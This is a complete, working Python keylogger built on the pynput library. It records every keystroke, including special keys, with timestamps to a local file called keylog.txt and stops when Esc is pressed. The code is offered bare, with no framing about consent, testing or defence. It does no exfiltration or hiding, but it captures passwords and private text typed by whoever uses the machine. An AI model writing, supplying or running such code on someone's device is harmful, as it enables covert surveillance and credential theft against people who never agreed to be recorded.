import pynput
from pynput.keyboard import Key, Listener
import logging
import os

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

class Keylogger:
    def __init__(self):
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def on_press(self, key):
        try:
            logging.debug(f'Pressed: {key.char}')
        except AttributeError:
            if key == Key.space:
                logging.debug('Pressed: Space')
            elif key == Key.enter:
                logging.debug('Pressed: Enter')
            elif key == Key.tab:
                logging.debug('Pressed: Tab')
            else:
                logging.debug(f'Pressed: {key}')

    def on_release(self, key):
        if key == Key.esc:
            # Stop listener
            self.listener.stop()
            return False

    def run(self):
        self.listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()




